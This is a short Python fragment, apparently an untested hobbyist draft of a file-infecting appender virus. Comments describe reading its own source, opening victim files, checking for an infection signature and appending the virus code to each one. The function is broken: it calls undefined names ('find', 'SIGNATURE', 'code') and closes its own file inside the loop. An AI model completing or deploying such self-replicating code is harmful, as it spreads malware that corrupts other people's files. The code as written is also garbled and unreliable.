import glob		#
import os		#

# Did not test the code

# Alternate
# Open Virus file
# Store the virus code in a string
# Open Victim File
# Check for Signatures
# Write virus_string to victim file 

def appender(file_set):						#
	for victim_file in file_set:			#
		virus=open(__file__,'r')			#
		victim=open(victim_file,'r')		#
		f=victim.read()						#
		if find(f,SIGNATURE)==-1:			#
			victim=open(victim_file,'a')	#
			for virus_code in virus.read():	#
				if("#") in code:		#
					virus.close()		#
					code=chr(10)+code	#
					victim.write(code)	#